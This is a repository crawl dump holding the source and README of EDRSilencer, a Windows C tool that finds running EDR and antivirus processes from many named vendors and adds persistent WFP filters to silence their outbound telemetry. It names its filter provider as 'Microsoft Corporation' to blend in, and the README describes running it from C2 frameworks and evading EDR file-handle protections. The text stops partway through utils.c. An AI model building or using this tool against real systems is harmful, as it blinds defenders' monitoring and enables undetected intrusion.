{
  "metadata": {
    "timestamp": 1736710242385,
    "page": 982,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjk5MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "netero1010/EDRSilencer",
      "stars": 1553,
      "defaultBranch": "main",
      "files": [
        {
          "name": "EDRSilencer.c",
          "type": "blob",
          "size": 19.0908203125,
          "content": "#include \"utils.h\"\r\n\r\nchar* edrProcess[] = {\r\n// Microsoft Defender for Endpoint and Microsoft Defender Antivirus\r\n    \"MsMpEng.exe\",\r\n    \"MsSense.exe\",\r\n    \"SenseIR.exe\",\r\n    \"SenseNdr.exe\",\r\n    \"SenseCncProxy.exe\",\r\n    \"SenseSampleUploader.exe\",\r\n// Elastic EDR\r\n\t\"winlogbeat.exe\",\r\n    \"elastic-agent.exe\",\r\n    \"elastic-endpoint.exe\",\r\n    \"filebeat.exe\",\r\n// Trellix EDR\r\n    \"xagt.exe\",\r\n// Qualys EDR\r\n    \"QualysAgent.exe\",\r\n// SentinelOne\r\n    \"SentinelAgent.exe\",\r\n    \"SentinelAgentWorker.exe\",\r\n    \"SentinelServiceHost.exe\",\r\n    \"SentinelStaticEngine.exe\",  \r\n    \"LogProcessorService.exe\",\r\n    \"SentinelStaticEngineScanner.exe\",\r\n    \"SentinelHelperService.exe\",\r\n    \"SentinelBrowserNativeHost.exe\",\r\n// Cylance\r\n    \"CylanceSvc.exe\",\r\n// Cybereason\r\n    \"AmSvc.exe\",\r\n    \"CrAmTray.exe\",\r\n    \"CrsSvc.exe\",\r\n    \"ExecutionPreventionSvc.exe\",\r\n    \"CybereasonAV.exe\",\r\n// Carbon Black EDR\r\n    \"cb.exe\",\r\n// Carbon Black Cloud\r\n    \"RepMgr.exe\",\r\n    \"RepUtils.exe\",\r\n    \"RepUx.exe\",\r\n    \"RepWAV.exe\",\r\n    \"RepWSC.exe\",\r\n// Tanium\r\n    \"TaniumClient.exe\",\r\n    \"TaniumCX.exe\",\r\n    \"TaniumDetectEngine.exe\",\r\n// Palo Alto Networks Traps/Cortex XDR\r\n    \"Traps.exe\",\r\n    \"cyserver.exe\",\r\n    \"CyveraService.exe\",\r\n    \"CyvrFsFlt.exe\",\r\n// FortiEDR\r\n    \"fortiedr.exe\",\r\n// Cisco Secure Endpoint (Formerly Cisco AMP)\r\n    \"sfc.exe\",\r\n// ESET Inspect\r\n    \"EIConnector.exe\",\r\n    \"ekrn.exe\",\r\n// Harfanglab EDR\r\n    \"hurukai.exe\",\r\n//TrendMicro Apex One\r\n    \"CETASvc.exe\",\r\n    \"WSCommunicator.exe\",\r\n    \"EndpointBasecamp.exe\",\r\n    \"TmListen.exe\",\r\n    \"Ntrtscan.exe\",\r\n    \"TmWSCSvc.exe\",\r\n    \"PccNTMon.exe\",\r\n    \"TMBMSRV.exe\",\r\n    \"CNTAoSMgr.exe\",\r\n    \"TmCCSF.exe\"\r\n};\r\n\r\n// The \"unblockall\" feature will delete all filters that are based on the custom filter name\r\nWCHAR* filterName = L\"Custom Outbound Filter\";\r\nWCHAR* providerName = L\"Microsoft Corporation\";\r\n// provider description has to be unique because:\r\n// - avoid problem in adding persistent WFP filter to a provider (error 0x80320016)\r\n// - avoid removing legitimate WFP provider\r\nWCHAR* providerDescription = L\"Microsoft Windows WFP Built-in custom provider.\";\r\n\r\nBOOL inWfpFlag[sizeof(edrProcess) / sizeof(edrProcess[0])] = { FALSE };\r\n\r\n// Check if the running process is our list\r\nBOOL isInEdrProcessList(const char* procName) {\r\n    for (int i = 0; i < sizeof(edrProcess) / sizeof(edrProcess[0]); i++) {\r\n        if (strcmp(procName, edrProcess[i]) == 0 && !inWfpFlag[i]) {\r\n            inWfpFlag[i] = TRUE;\r\n            return TRUE;\r\n        }\r\n    }\r\n    return FALSE;\r\n}\r\n\r\n// Add WFP filters for all known EDR process(s)\r\nvoid BlockEdrProcessTraffic() {\r\n    DWORD result = 0;\r\n    HANDLE hEngine = NULL;\r\n    HANDLE hProcessSnap = NULL;\r\n    HANDLE hModuleSnap = NULL;\r\n    PROCESSENTRY32 pe32 = {0};\r\n    BOOL isEdrDetected = FALSE;\r\n\r\n    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);\r\n    if (result != ERROR_SUCCESS) {\r\n        printf(\"[-] FwpmEngineOpen0 failed with error code: 0x%x.\\n\", result);\r\n        return;\r\n    }\r\n   \r\n    EnableSeDebugPrivilege();\r\n\r\n    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\r\n    if (hProcessSnap == INVALID_HANDLE_VALUE) {\r\n        printf(\"[-] CreateToolhelp32Snapshot (of processes) failed with error code: 0x%x.\\n\", GetLastError());\r\n        return;\r\n    }\r\n\r\n    pe32.dwSize = sizeof(PROCESSENTRY32);\r\n    if (!Process32First(hProcessSnap, &pe32)) {\r\n        printf(\"[-] Process32First failed with error code: 0x%x.\\n\", GetLastError());\r\n        CloseHandle(hProcessSnap);\r\n        return;\r\n    }\r\n\r\n    do {\r\n        if (isInEdrProcessList(pe32.szExeFile)) {\r\n            isEdrDetected = TRUE;\r\n            printf(\"Detected running EDR process: %s (%d):\\n\", pe32.szExeFile, pe32.th32ProcessID);\r\n            // Get full path of the running process\r\n            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);\r\n            if (hProcess) {\r\n                WCHAR fullPath[MAX_PATH] = {0};\r\n                DWORD size = MAX_PATH;\r\n                FWPM_FILTER_CONDITION0 cond = {0};\r\n                FWPM_FILTER0 filter = {0};\r\n                FWPM_PROVIDER0 provider = {0};\r\n                GUID providerGuid = {0};\r\n                FWP_BYTE_BLOB* appId = NULL;\r\n                UINT64 filterId = 0;\r\n                ErrorCode errorCode = CUSTOM_SUCCESS;\r\n                \r\n                QueryFullProcessImageNameW(hProcess, 0, fullPath, &size);\r\n                errorCode = CustomFwpmGetAppIdFromFileName0(fullPath, &appId);\r\n                if (errorCode != CUSTOM_SUCCESS) {\r\n                    switch (errorCode) {\r\n                        case CUSTOM_FILE_NOT_FOUND:\r\n                            printf(\"    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \\\"%S\\\" to app ID format. The file path cannot be found.\\n\", fullPath);\r\n                            break;\r\n                        case CUSTOM_MEMORY_ALLOCATION_ERROR:\r\n                            printf(\"    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \\\"%S\\\" to app ID format. Error occurred in allocating memory for appId.\\n\", fullPath);\r\n                            break;\r\n                        case CUSTOM_NULL_INPUT:\r\n                            printf(\"    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \\\"%S\\\" to app ID format. Please check your input.\\n\", fullPath);\r\n                            break;\r\n                        case CUSTOM_DRIVE_NAME_NOT_FOUND:\r\n                            printf(\"    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \\\"%S\\\" to app ID format. The drive name cannot be found.\\n\", fullPath);\r\n                            break;\r\n                        case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:\r\n                            printf(\"    [-] CustomFwpmGetAppIdFromFileName0 failed to convert the \\\"%S\\\" to app ID format. Failed to convert drive name to DOS device name.\\n\", fullPath);\r\n                            break;\r\n                        default:\r\n                            break;\r\n                    }\r\n                    CloseHandle(hProcess);\r\n                    continue;\r\n                } \r\n\r\n                // Sett up WFP filter and condition\r\n                filter.displayData.name = filterName;\r\n                filter.flags = FWPM_FILTER_FLAG_PERSISTENT;\r\n                filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;\r\n                filter.action.type = FWP_ACTION_BLOCK;\r\n                UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;\r\n                filter.weight.type = FWP_UINT64;\r\n                filter.weight.uint64 = &weightValue;\r\n                cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;\r\n                cond.matchType = FWP_MATCH_EQUAL;\r\n                cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;\r\n                cond.conditionValue.byteBlob = appId;\r\n                filter.filterCondition = &cond;\r\n                filter.numFilterConditions = 1;\r\n\r\n                 // Add WFP provider for the filter\r\n                if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {\r\n                    filter.providerKey = &providerGuid;\r\n                } else {\r\n                    provider.displayData.name = providerName;\r\n                    provider.displayData.description = providerDescription;\r\n                    provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;\r\n                    result = FwpmProviderAdd0(hEngine, &provider, NULL);\r\n                    if (result != ERROR_SUCCESS) {\r\n                        printf(\"    [-] FwpmProviderAdd0 failed with error code: 0x%x.\\n\", result);\r\n                    } else {\r\n                        if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {\r\n                            filter.providerKey = &providerGuid;\r\n                        }\r\n                    }\r\n                }\r\n\r\n                // Add filter to both IPv4 and IPv6 layers\r\n                result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);\r\n                if (result == ERROR_SUCCESS) {\r\n                    printf(\"    Added WFP filter for \\\"%S\\\" (Filter id: %d, IPv4 layer).\\n\", fullPath, filterId);\r\n                } else {\r\n                    printf(\"    [-] Failed to add filter in IPv4 layer with error code: 0x%x.\\n\", result);\r\n                }\r\n                \r\n                filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;\r\n                result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);\r\n                if (result == ERROR_SUCCESS) {\r\n                    printf(\"    Added WFP filter for \\\"%S\\\" (Filter id: %d, IPv6 layer).\\n\", fullPath, filterId);\r\n                } else {\r\n                    printf(\"    [-] Failed to add filter in IPv6 layer with error code: 0x%x.\\n\", result);\r\n                }\r\n\r\n                FreeAppId(appId);\r\n                CloseHandle(hProcess);\r\n            } else {\r\n                printf(\"    [-] Could not open process \\\"%s\\\" with error code: 0x%x.\\n\", pe32.szExeFile, GetLastError());\r\n            }\r\n        }\r\n    } while (Process32Next(hProcessSnap, &pe32));\r\n\r\n    if (!isEdrDetected) {\r\n        printf(\"[-] No EDR process was detected. Please double check the edrProcess list or add the filter manually using 'block' command.\\n\");\r\n    }\r\n    CloseHandle(hProcessSnap);\r\n    FwpmEngineClose0(hEngine);\r\n    return;\r\n}\r\n\r\n// Add block WFP filter to user-defined process\r\nvoid BlockProcessTraffic(char* fullPath) {\r\n    DWORD result = 0;\r\n    HANDLE hEngine = NULL;\r\n    WCHAR wFullPath[MAX_PATH] = {0};\r\n    DWORD size = MAX_PATH;\r\n    FWPM_FILTER_CONDITION0 cond = {0};\r\n    FWPM_FILTER0 filter = {0};\r\n    FWPM_PROVIDER0 provider = {0};\r\n    GUID providerGuid = {0};\r\n    FWP_BYTE_BLOB* appId = NULL;\r\n    UINT64 filterId = 0;\r\n    ErrorCode errorCode = CUSTOM_SUCCESS;\r\n    \r\n    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);\r\n    if (result != ERROR_SUCCESS) {\r\n        printf(\"[-] FwpmEngineOpen0 failed with error code: 0x%x.\\n\", result);\r\n        return;\r\n    }\r\n    CharArrayToWCharArray(fullPath, wFullPath, sizeof(wFullPath) / sizeof(wFullPath[0]));\r\n    errorCode = CustomFwpmGetAppIdFromFileName0(wFullPath, &appId);\r\n    if (errorCode != CUSTOM_SUCCESS) {\r\n        switch (errorCode) {\r\n            case CUSTOM_FILE_NOT_FOUND:\r\n                printf(\"[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \\\"%S\\\" to app ID format. The file path cannot be found.\\n\", wFullPath);\r\n                break;\r\n            case CUSTOM_MEMORY_ALLOCATION_ERROR:\r\n                printf(\"[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \\\"%S\\\" to app ID format. Error occurred in allocating memory for appId.\\n\", wFullPath);\r\n                break;\r\n            case CUSTOM_NULL_INPUT:\r\n                printf(\"[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \\\"%S\\\" to app ID format. Please check your input.\\n\", wFullPath);\r\n                break;\r\n            case CUSTOM_DRIVE_NAME_NOT_FOUND:\r\n                printf(\"[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \\\"%S\\\" to app ID format. The drive name cannot be found.\\n\", wFullPath);\r\n                break;\r\n            case CUSTOM_FAILED_TO_GET_DOS_DEVICE_NAME:\r\n                printf(\"[-] CustomFwpmGetAppIdFromFileName0 failed to convert the \\\"%S\\\" to app ID format. Failed to convert drive name to DOS device name.\\n\", wFullPath);\r\n                break;\r\n            default:\r\n                break;\r\n        }\r\n        return;\r\n    }\r\n\r\n    // Setting up WFP filter and condition\r\n    filter.displayData.name = filterName;\r\n    filter.flags = FWPM_FILTER_FLAG_PERSISTENT;\r\n    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;\r\n    filter.action.type = FWP_ACTION_BLOCK;\r\n    UINT64 weightValue = 0xFFFFFFFFFFFFFFFF;\r\n    filter.weight.type = FWP_UINT64;\r\n    filter.weight.uint64 = &weightValue;\r\n    cond.fieldKey = FWPM_CONDITION_ALE_APP_ID;\r\n    cond.matchType = FWP_MATCH_EQUAL;\r\n    cond.conditionValue.type = FWP_BYTE_BLOB_TYPE;\r\n    cond.conditionValue.byteBlob = appId;\r\n    filter.filterCondition = &cond;\r\n    filter.numFilterConditions = 1;\r\n\r\n    // Add WFP provider for the filter\r\n    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {\r\n        filter.providerKey = &providerGuid;\r\n    } else {\r\n        provider.displayData.name = providerName;\r\n        provider.displayData.description = providerDescription;\r\n        provider.flags = FWPM_PROVIDER_FLAG_PERSISTENT;\r\n        result = FwpmProviderAdd0(hEngine, &provider, NULL);\r\n        if (result != ERROR_SUCCESS) {\r\n            printf(\"[-] FwpmProviderAdd0 failed with error code: 0x%x.\\n\", result);\r\n        } else {\r\n            if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {\r\n                filter.providerKey = &providerGuid;\r\n            }\r\n        }\r\n    }\r\n\r\n    // Add filter to both IPv4 and IPv6 layers\r\n    result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);\r\n    if (result == ERROR_SUCCESS) {\r\n        printf(\"Added WFP filter for \\\"%s\\\" (Filter id: %d, IPv4 layer).\\n\", fullPath, filterId);\r\n    } else {\r\n        printf(\"[-] Failed to add filter in IPv4 layer with error code: 0x%x.\\n\", result);\r\n    }\r\n\r\n    filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V6;\r\n    result = FwpmFilterAdd0(hEngine, &filter, NULL, &filterId);\r\n    if (result == ERROR_SUCCESS) {\r\n        printf(\"Added WFP filter for \\\"%s\\\" (Filter id: %d, IPv6 layer).\\n\", fullPath, filterId);\r\n    } else {\r\n        printf(\"[-] Failed to add filter in IPv6 layer with error code: 0x%x.\\n\", result);\r\n    }\r\n\r\n    FreeAppId(appId);\r\n    FwpmEngineClose0(hEngine);\r\n    return;\r\n}\r\n\r\n// Remove all WFP filters previously created\r\nvoid UnblockAllWfpFilters() {\r\n    HANDLE hEngine = NULL;\r\n    DWORD result = 0;\r\n    HANDLE enumHandle = NULL;\r\n    FWPM_FILTER0** filters = NULL;\r\n    GUID providerGuid = {0};\r\n    UINT32 numFilters = 0;\r\n    BOOL foundFilter = FALSE;\r\n    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);\r\n    if (result != ERROR_SUCCESS) {\r\n        printf(\"[-] FwpmEngineOpen0 failed with error code: 0x%x.\\n\", result);\r\n        return;\r\n    }\r\n\r\n    result = FwpmFilterCreateEnumHandle0(hEngine, NULL, &enumHandle);\r\n    if (result != ERROR_SUCCESS) {\r\n        printf(\"[-] FwpmFilterCreateEnumHandle0 failed with error code: 0x%x.\\n\", result);\r\n        return;\r\n    }\r\n\r\n    while(TRUE) {\r\n        result = FwpmFilterEnum0(hEngine, enumHandle, 1, &filters, &numFilters);\r\n\r\n        if (result != ERROR_SUCCESS) {\r\n            printf(\"[-] FwpmFilterEnum0 failed with error code: 0x%x.\\n\", result);\r\n            FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);\r\n            FwpmEngineClose0(hEngine);\r\n            return;\r\n        }\r\n\r\n        if (numFilters == 0) {\r\n\t\t\tbreak;\r\n        }\r\n        \r\n        FWPM_DISPLAY_DATA0 *data = &filters[0]->displayData;\r\n        WCHAR* currentFilterName = data->name;\r\n        if (wcscmp(currentFilterName, filterName) == 0) {\r\n            foundFilter = TRUE;\r\n            UINT64 filterId = filters[0]->filterId;\r\n            result = FwpmFilterDeleteById0(hEngine, filterId);\r\n            if (result == ERROR_SUCCESS) {\r\n                printf(\"Deleted filter id: %llu.\\n\", filterId);\r\n            } else {\r\n                printf(\"[-] Failed to delete filter id: %llu with error code: 0x%x.\\n\", filterId, result);\r\n            }\r\n        }\r\n    }\r\n\r\n    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {\r\n        result = FwpmProviderDeleteByKey0(hEngine, &providerGuid);\r\n        if (result != ERROR_SUCCESS) {\r\n            if (result != FWP_E_IN_USE) {\r\n                printf(\"[-] FwpmProviderDeleteByKey0 failed with error code: 0x%x.\\n\", result);\r\n            }\r\n        } else {\r\n            printf(\"Deleted custom WFP provider.\\n\");\r\n        }\r\n    }\r\n\r\n    if (!foundFilter) {\r\n        printf(\"[-] Unable to find any WFP filter created by this tool.\\n\");\r\n    }\r\n    FwpmFilterDestroyEnumHandle0(hEngine, enumHandle);\r\n    FwpmEngineClose0(hEngine);\r\n}\r\n\r\n// Remove WFP filter based on filter id\r\nvoid UnblockWfpFilter(UINT64 filterId) {\r\n    HANDLE hEngine = NULL;\r\n    DWORD result = 0;\r\n    GUID providerGuid = {0};\r\n\r\n    result = FwpmEngineOpen0(NULL, RPC_C_AUTHN_DEFAULT, NULL, NULL, &hEngine);\r\n    if (result != ERROR_SUCCESS) {\r\n        printf(\"[-] FwpmEngineOpen0 failed with error code: 0x%x.\\n\", result);\r\n        return;\r\n    }\r\n    \r\n    result = FwpmFilterDeleteById0(hEngine, filterId);\r\n\r\n    if (result == ERROR_SUCCESS) {\r\n        printf(\"Deleted filter id: %llu.\\n\", filterId);\r\n    }\r\n    else if (result == FWP_E_FILTER_NOT_FOUND) {\r\n        printf(\"[-] The filter does not exist.\\n\");\r\n    } else {\r\n        printf(\"[-] Failed to delete filter id: %llu with error code: 0x%x.\\n\", filterId, result);\r\n    }\r\n\r\n    if (GetProviderGUIDByDescription(providerDescription, &providerGuid)) {\r\n        result = FwpmProviderDeleteByKey0(hEngine, &providerGuid);\r\n        if (result != ERROR_SUCCESS) {\r\n            if (result != FWP_E_IN_USE) {\r\n                printf(\"[-] FwpmProviderDeleteByKey0 failed with error code: 0x%x.\\n\", result);\r\n            }\r\n        } else {\r\n            printf(\"Deleted custom WFP provider.\\n\");\r\n        }\r\n    }\r\n\r\n    FwpmEngineClose0(hEngine);\r\n}\r\n\r\nvoid PrintHelp() {\r\n    printf(\"Usage: EDRSilencer.exe <blockedr/block/unblockall/unblock>\\n\");\r\n    printf(\"Version: 1.4\\n\");\r\n    printf(\"- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:\\n\");\r\n    printf(\"  EDRSilencer.exe blockedr\\n\\n\");\r\n    printf(\"- Add WFP filters to block the IPv4 and IPv6 outbound traffic of a specific process (full path is required):\\n\");\r\n    printf(\"  EDRSilencer.exe block \\\"C:\\\\Windows\\\\System32\\\\curl.exe\\\"\\n\\n\");\r\n    printf(\"- Remove all WFP filters applied by this tool:\\n\");\r\n    printf(\"  EDRSilencer.exe unblockall\\n\\n\");\r\n    printf(\"- Remove a specific WFP filter based on filter id:\\n\");\r\n    printf(\"  EDRSilencer.exe unblock <filter id>\");\r\n}\r\n\r\nint main(int argc, char *argv[]) {\r\n    if (argc < 2) {\r\n        PrintHelp();\r\n        return 1;\r\n    }\r\n\r\n    if (strcasecmp(argv[1], \"-h\") == 0 || strcasecmp(argv[1], \"--help\") == 0) {\r\n        PrintHelp();\r\n        return 1;\r\n    }\r\n    \r\n    if (!CheckProcessIntegrityLevel()) {\r\n        return 1;\r\n    }\r\n\r\n    if (strcmp(argv[1], \"blockedr\") == 0) {\r\n        BlockEdrProcessTraffic();\r\n    } else if (strcmp(argv[1], \"block\") == 0) {\r\n        if (argc < 3) {\r\n            printf(\"[-] Missing second argument. Please provide the full path of the process to block.\\n\");\r\n            return 1;\r\n        }\r\n        BlockProcessTraffic(argv[2]);\r\n    } else if (strcmp(argv[1], \"unblockall\") == 0) {\r\n        UnblockAllWfpFilters();\r\n    } else if (strcmp(argv[1], \"unblock\") == 0) {\r\n        if (argc < 3) {\r\n            printf(\"[-] Missing argument for 'unblock' command. Please provide the filter id.\\n\");\r\n            return 1;\r\n        }\r\n        char *endptr;\r\n        errno = 0;\r\n\r\n        UINT64 filterId = strtoull(argv[2], &endptr, 10);\r\n\r\n        if (errno != 0) {\r\n            printf(\"[-] strtoull failed with error code: 0x%x.\\n\", errno);\r\n            return 1;\r\n        }\r\n\r\n        if (endptr == argv[2]) {\r\n            printf(\"[-] Please provide filter id in digits.\\n\");\r\n            return 1;\r\n        }\r\n        UnblockWfpFilter(filterId);\r\n    } else {\r\n        printf(\"[-] Invalid argument: \\\"%s\\\".\\n\", argv[1]);\r\n        return 1;\r\n    }\r\n    return 0;\r\n}"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.0400390625,
          "content": "MIT License\n\nCopyright (c) 2023 Chris Au\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 2.7626953125,
          "content": "# EDRSilencer\r\nInspired by the closed source FireBlock tool [FireBlock](https://www.mdsec.co.uk/2023/09/nighthawk-0-2-6-three-wise-monkeys/) from MdSec NightHawk, I decided to create my own version and this tool was created with the aim of blocking the outbound traffic of running EDR processes using Windows Filtering Platform (WFP) APIs.\r\n\r\nThis tool offers the following features:\r\n- Search known running EDR processes and add WFP filter to block its outbound traffic\r\n- Add WFP filter for a specific process\r\n- Remove all WFP filters created by this tool\r\n- Remove a specific WFP filter by filter id\r\n- Support to run in C2 with in-memory PE execution module (e.g., `BruteRatel's memexec`)\r\n- Some EDR controls (e.g., minifilter) deny access when a process attempts to obtain a file handle of its EDR processes (e.g., through `CreateFileW`). However, the `FwpmGetAppIdFromFileName0` API, which is used to obtain the FWP app id of the targeted EDR process, calls `CreateFileW` internally. To avoid this, a custom `FwpmGetAppIdFromFileName0` was implemented to construct the app id without invoking `CreateFileW`, thus preventing unexpected failures when adding a WFP filter to an EDR process\r\n\r\nThe tool currently supports the following EDRs:\r\n- Microsoft Defender for Endpoint and Microsoft Defender Antivirus\r\n- Elastic EDR\r\n- Trellix EDR\r\n- Qualys EDR\r\n- SentinelOne\r\n- Cylance\r\n- Cybereason\r\n- Carbon Black EDR\r\n- Carbon Black Cloud\r\n- Tanium\r\n- Palo Alto Networks Traps/Cortex XDR\r\n- FortiEDR\r\n- Cisco Secure Endpoint (Formerly Cisco AMP)\r\n- ESET Inspect\r\n- Harfanglab EDR\r\n- TrendMicro Apex One\r\n\r\n**As I do not have access to all these EDRs for testing, please do not hesitate to correct me if the listed processes (edrProcess in `EDRSilencer.c`) prove insufficient in blocking all alert, detection, or event forward traffic.**\r\n\r\n## Testing Environment\r\nTested in Windows 10 and Windows Server 2016\r\n\r\n## Usage\r\n```\r\nUsage: EDRSilencer.exe <blockedr/block/unblockall/unblock>\r\n- Add WFP filters to block the IPv4 and IPv6 outbound traffic of all detected EDR processes:\r\n  EDRSilencer.exe blockedr\r\n\r\n- Add WFP filters to block the IPv4 and IPv6 outbound traffic of a specific process (full path is required):\r\n  EDRSilencer.exe block \"C:\\Windows\\System32\\curl.exe\"\r\n\r\n- Remove all WFP filters applied by this tool:\r\n  EDRSilencer.exe unblockall\r\n\r\n- Remove a specific WFP filter based on filter id:\r\n  EDRSilencer.exe unblock <filter id>\r\n```\r\n\r\n## Compile\r\n```\r\nx86_64-w64-mingw32-gcc EDRSilencer.c utils.c -o EDRSilencer.exe -lfwpuclnt\r\n```\r\n\r\n## Example\r\n### Detect and block the outbound traffic of running EDR processes\r\n```\r\nEDRSilencer.exe blockedr\r\n```\r\n![HowTo](https://github.com/netero1010/EDRSilencer/raw/main/example.png)\r\n\r\n## Credits\r\nhttps://www.mdsec.co.uk/2023/09/nighthawk-0-2-6-three-wise-monkeys/"
        },
        {
          "name": "example.png",
          "type": "blob",
          "size": 44.0927734375,
          "content": null
        },
        {
          "name": "utils.c",
          "type": "blob",
          "size": 7.943359375,
          "content": "#include \"utils.h\"\r\n\r\nBOOL CheckProcessIntegrityLevel() {\r\n    HANDLE hToken = NULL;\r\n    DWORD dwLength = 0;\r\n    PTOKEN_MANDATORY_LABEL pTIL = NULL;\r\n    DWORD dwIntegrityLevel = 0;\r\n    BOOL isHighIntegrity = FALSE;\r\n\r\n    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {\r\n        if (GetLastError() != ERROR_NO_TOKEN) {\r\n            printf(\"[-] OpenThreadToken failed with error code: 0x%x.\\n\", GetLastError());\r\n            return FALSE;\r\n        }\r\n\r\n        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {\r\n            printf(\"[-] OpenProcessToken failed with error code: 0x%x.\\n\", GetLastError());\r\n            return FALSE;\r\n        }\r\n    }\r\n\r\n    // Get the size of the integrity level information\r\n    if (!GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &dwLength) && \r\n        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {\r\n        printf(\"[-] GetTokenInformation failed with error code: 0x%x.\\n\", GetLastError());\r\n        CloseHandle(hToken);\r\n        return FALSE;\r\n    }\r\n\r\n    pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwLength);\r\n    if (pTIL == NULL) {\r\n        printf(\"[-] LocalAlloc failed with error code: 0x%x.\\n\", GetLastError());\r\n        CloseHandle(hToken);\r\n        return FALSE;\r\n    }\r\n\r\n    if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, dwLength, &dwLength)) {\r\n        printf(\"[-] GetTokenInformation failed with error code: 0x%x.\\n\", GetLastError());\r\n        LocalFree(pTIL);\r\n        CloseHandle(hToken);\r\n        return FALSE;\r\n    }\r\n\r\n    if (pTIL->Label.Sid == NULL || *GetSidSubAuthorityCount(pTIL->Label.Sid) < 1) {\r\n        printf(\"[-] SID structure is invalid.\\n\");\r\n        LocalFree(pTIL);\r\n        CloseHandle(hToken);\r\n        return FALSE;\r\n    }\r\n\t\r\n    dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));\r\n\r\n    if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {\r\n        isHighIntegrity = TRUE;\r\n    } else {\r\n        printf(\"[-] This program requires to run in high integrity level.\\n\");\r\n    }\r\n\r\n    LocalFree(pTIL);\r\n    CloseHandle(hToken);\r\n    return isHighIntegrity;\r\n}\r\n\r\n// Enable SeDebugPrivilege to obtain full path of running processes\r\nBOOL EnableSeDebugPrivilege() {\r\n\tHANDLE hToken = NULL;\r\n\tTOKEN_PRIVILEGES tokenPrivileges = {0};\r\n\t\r\n    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, TRUE, &hToken)) {\r\n        if (GetLastError() != ERROR_NO_TOKEN) {\r\n            printf(\"[-] OpenThreadToken failed with error code: 0x%x.\\n\", GetLastError());\r\n            return FALSE;\r\n        }\r\n\r\n        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {\r\n            printf(\"[-] OpenProcessToken failed with error code: 0x%x.\\n\", GetLastError());\r\n            return FALSE;\r\n        }\r\n    }\r\n\r\n\tif (!LookupPrivilegeValueA(NULL, \"SeDebugPrivilege\", &tokenPrivileges.Privileges[0].Luid)){\r\n        printf(\"[-] LookupPrivilegeValueA failed with error code: 0x%x.\\n\", GetLastError());\r\n\t\tCloseHandle(hToken);\r\n\t\treturn FALSE;\r\n\t}\r\n\r\n\ttokenPrivileges.PrivilegeCount = 1;\r\n\ttokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\r\n\r\n\tif (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {\r\n        printf(\"[-] AdjustTokenPrivileges failed with error code: 0x%x.\\n\", GetLastError());\r\n\t\tCloseHandle(hToken);\r\n\t\treturn FALSE;\r\n\t}\r\n\r\n    if 